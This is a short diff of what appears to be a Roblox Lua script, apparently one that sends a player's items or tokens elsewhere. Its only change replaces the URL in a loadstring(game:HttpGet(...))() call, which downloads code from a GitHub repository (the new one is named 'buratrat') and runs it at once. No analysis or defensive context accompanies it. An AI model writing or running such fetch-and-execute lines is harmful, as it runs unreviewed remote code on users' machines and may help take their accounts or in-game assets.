@@ -569,4 +569,4 @@ if #itemsToSend > 0 or totalTokens > 0 then
 end
 
 task.wait(1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/frierenXyz/23ghdsnubig/refs/heads/main/bbb.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/frierenXyz/buratrat/refs/heads/main/mainn.lua"))()
